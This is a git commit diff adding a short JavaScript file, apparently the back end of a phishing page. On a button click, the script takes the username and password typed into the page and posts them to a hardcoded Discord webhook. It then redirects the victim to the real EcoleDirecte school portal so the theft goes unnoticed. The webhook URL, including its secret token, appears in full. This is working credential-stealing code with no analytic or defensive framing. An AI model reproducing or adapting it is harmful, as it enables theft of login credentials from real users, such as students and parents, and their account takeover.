dc0c1ba5a2a54010a655c92677d1367f567572c2
YknotTYD <136177613+YknotTYD@users.noreply.github.com>
2024-05-21 17:41:03 +0200

    Add files via upload
    Added JS.

---
+++ script.js
@@ -0,0 +1,17 @@
+//test
+
+//https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx
+
+const url="https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx"
+
+
+const button=document.getElementById("lilguy");
+const username=document.getElementById("username");
+const password=document.getElementById("password");
+
+button.onclick=async function e(){
+
+	const message={"content": "Received username: \""+username.value+"\" with password \""+password.value+"\"."}
+	await fetch(url, {"method": "POST","headers": {"content-type": "application/json"},"body": JSON.stringify(message)});
+	location.replace("https://www.ecoledirecte.com");
+};
